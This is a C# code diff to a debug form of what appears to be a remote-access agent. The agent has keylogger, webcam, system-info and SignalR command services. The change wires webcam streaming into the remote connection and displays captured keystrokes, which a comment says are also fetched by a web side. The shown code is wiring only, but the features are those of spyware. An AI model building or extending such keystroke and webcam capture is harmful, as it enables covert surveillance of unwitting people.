@@ -50,13 +50,14 @@ public class AgentDebugForm : Form
         _configuration = configuration;
         _commandHandler = new CommandHandler();
         _webCamService = new WebCamService();
-        _keyLoggerService = new KeyLoggerService();
+        _keyLoggerService = KeyLoggerService.Instance;
 
         // ✅ NEW: init SystemInfoService
         _systemInfoService = new SystemInfoService();
 
         // Init SignalR (ctor mới)
         _signalRService = new SignalRClientService(_commandHandler, _systemInfoService, _configuration);
+        _signalRService.SetWebCamService(_webCamService); // Wire webcam for streaming
         _signalRService.OnStatusChanged += (msg) => this.Invoke(() => UpdateStatus(msg));
         _signalRService.OnConnectionStateChanged += (state) => this.Invoke(() =>
         {
@@ -440,8 +441,12 @@ public class AgentDebugForm : Form
         {
             try
             {
-                var logs = _keyLoggerService.GetLogs();
-                if (!string.IsNullOrEmpty(logs)) _txtKeyLogs.AppendText(logs);
+                // Use PeekLogText to display without clearing entries (Web uses GetLogs)
+                var text = _keyLoggerService.PeekLogText();
+                if (!string.IsNullOrEmpty(text))
+                {
+                    _txtKeyLogs.AppendText(text);
+                }
             }
             catch { }
         };
